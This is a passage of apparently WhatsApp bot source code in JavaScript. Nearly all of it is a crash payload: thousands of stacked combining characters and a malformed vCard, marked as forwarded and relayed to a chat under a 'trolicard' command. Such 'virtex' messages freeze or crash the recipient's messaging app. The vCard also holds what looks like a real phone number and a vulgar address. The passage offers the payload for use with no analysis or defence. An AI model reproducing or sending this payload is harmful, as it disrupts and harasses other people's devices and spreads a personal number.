̵̸̡̧̛̼͕̞̠͖̙̭͚̥̪̥̳̀͘̕͢͜͜͜͜͡͝͡ͅ҉͟͏.̸̷̡̢̨̧̯̦̻̳͌̿̆̌͋ͯ̀̏ͥ͛̐̊ͨ́̚̚̚̕͞҉̷̴͠҉̡.̶̨͈̅̈́͒ͣͦ͒̽ͪͮ̒̽͂́̈́ͫ̏̉͐̚͜͠.̷̡͉̙̪̥̰̳̰͚͍͐̎̉̇.͇͎͕̳̳͕̊̓͂͑ͧͬͯ̍ͧͩ̚҉̴҉̶̶̢̧̧̧̡̢̛̛̕͜͢͜͠͡.̢̠̿̃̾ͬͥͭ́̚.̴̴̴̸̢͈̰̖̞͚͉̲̰̮̙̳̮̞͇ͯͥͩͨ̒ͮ̅ͭ̓͗͌͆ͮ͂͂ͭ̋ͨ̾͊͘͘̕͢͠͠͡͞.̭̼͉̗͇̺̙̩̱̖̥̏͒͑̇̊̓ͯ͒̄̈́̇.͖͕̙͕̹̘̖̻̯͐̾͐̇͒̿ͧ͢͡҉̧̨.̖͕̞͈̣̯̬̮̫͈̠͖̘ͦ͑ͩ̏ͥ̀ͬ̎̃̔̓̆̅ͬ̀̚̕͢͡ͅ.̶̴̸̠͕̟̩̜̦͓̘̓́͌̌ͯ̌̆ͯͨ̈́̈́̎͂͆̀̚͘͜͟͏̵̴̵̨̢͢.̸̴̨̨̫̣͍̬͓͚͈̺̹̥̜̟̦̺̼̈ͨ́̓ͣͧ͗̇ͩ́͘̕͢͞͠͠͝ͅ͏̶̵̸̢.̶̡̱̖͚̘̩̝͙̣̺̦͇̠̝̠͈̯͉͓͙̟͌͊ͥ̒ͥ͋ͨ̇̌̈́ͭ̿̅̌ͪ́͘͠͡.̵̢̡̨̨̛̯̟̩̘̙̘̽̎̀̆̉̉͋ͣ́͌̊̂̾́͘͜͟͝͠͝͡͠.̷̡͔̩̝̼̬̪̰̜̼̯̠͍̻̼̥͇̑̋ͣ̏͋͟͡ͅ͏̴̶̶̡̢̡̧̧̢́̕͢͢͜͝.̵̛ͣ̾̊́̂͐̊̈ͫ̒̿͗͗͊̔̓͋͋͂͡͡.̗̭̼͍̹̯̞͈͎̯̼̗ͪ͒͒̌ͬ̈̃ͬ͊ͫͤͅ.̨̢ͨͪ̉͊̉ͪ̾̄ͮ͋ͣ̋̌́ͬ̅͗́ͯ͢.̷̴̴̷̶̡̨̢̛̠͔̮̭͚̝̰͌̌̏ͬ͒̀͑̉̂̒̽́̕͟͜͢͞͝͠͞҉.̵̵͔͑͆ͧ̓̓ͧͧ́.̴̡̨̛̮͖̥͎̜̗͔͎̪̙̪͐͐ͬ͌̇̌̓͋̎̂͛͑̆̄̐̐͊ͪ̀̀̕̕͝͡͠.̙̱̝͍̤̖̰̱̈́̆͗ͪͥ͑͆ͪ̄̎ͩ͂̒ͪ̈́͑̓̎̿̌̕͡҉͢͡҉̶̧̧̨̛͟͟͠͝͏̵͝.̴̢̨̙̼̖̟̫̲̘̥͇̇͘.̼̘̫̦̹͖̲̺̱͚̜̟̣̜͍̊́ͥ̔̇̓͒͒ͮ̉ͨͮͨ͗̐͛ͅ͏̸̵́͡.̦̤͙̰̝̯͇͈̟̻̝̟͕͚͇̗̲͍̾̆͆́̃ͬ̐̅̚͏̸̧̧̛́͘̕͘͘͜͠͞.̟͎͔̦̫͚ͦ.̷̷̶̰̙̩͎̞̟̬̣͕̻̟̳͈̰̽͐͛ͥͨ̾͛̊͆͒̒̅ͣ̾̊͑ͬ̐̒͘͟͟͟͠ͅͅͅ҉̕̕͘͏̸͠.̴̷̡̨̟̲̩̙͙̩̻̱̋ͅ͏͏̶͏͠.̭̥̙̖̹̩͔̼̞͉̣̱̭͗ͥ͂͒͊̏̐̃̏.̵̷̨̟̠̖̤̮͙̙̟̻̮͕̻̬͙͉̞̙̎͆ͮ́҉̸̡̛̀̕͘͜͟.̵̛ͩͧ̌̓ͮͮ̎͒̀͜͝.̸̶̬͈̻̖̜̳̹̜̯̯̖͚̝̟̪̻͔̳̃ͤ̓͌̒̾̀̚͢͟͠.̠͎̦͚̣̺̪̼͚̝̗͕̻͓ͬ̇̇ͧ̑̎͐͞.̷̴̴̵̴̴̭͕͓̥̫̜̹̼̞̗̈́ͨͧ̐̓̌ͬͫ̈̎̐͂̀̀͟͜͢.̵̨̡͈͉͙̺̭̝̪̖̱͆ͬ̅ͦ̋͂̌̂̽͛ͭ̓͛̓̽ͪͩ̇̈́͑͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6285339388512\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD`,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: mek, contextInfo:{}}) 
wibu.relayWAMessage(res)
break
case 'trolicard':
